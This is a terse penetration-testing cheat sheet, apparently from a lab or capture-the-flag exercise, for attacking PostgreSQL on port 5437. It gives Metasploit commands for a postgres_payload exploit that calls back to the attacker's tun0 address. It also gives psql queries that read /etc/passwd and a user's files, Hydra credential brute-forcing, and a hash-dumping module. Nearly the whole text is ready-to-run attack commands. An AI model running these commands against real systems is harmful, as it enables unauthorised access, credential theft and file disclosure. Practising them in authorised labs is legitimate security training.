# Commands
### Exploitation via Metasploit:
`5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7`
```bash
use exploit(linux/postgres/postgres_payload)
set RHOST <target-ip>
set RPORT 5437
set LHOST tun0
run
```
### Manual Access via psql:
```bash
psql -U postgres -p 5437 -h <target-ip>
```

###
```bash
SELECT pg_ls_dir('./');
SELECT pg_ls_dir('/etc/passwd');
SELECT pg_ls_dir('/home/wilson');
SELECT pg_read_file('/home/wilson/local.txt');
```

### Brute Force Credentials
```bash
hydra -l username -P passwords.txt <target-ip> postgres
hydra -L usernames.txt -p password <target-ip> postgres

# Metasploit
msfconsole
msf> use auxiliary/scanner/postgres/postgres_login
msf> set rhosts <target-ip>
msf> run
```

### Dump User Hashes
```bash
msfconsole
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> set rhosts <target-ip>
msf> set username <username>
msf> set password <password>
msf> run
```

## Config File
```bash
# Version 14.x
/etc/postgresql/14/main/postgresql.conf
# Version 15.x
/etc/postgresql/15/main/postgresql.conf
```
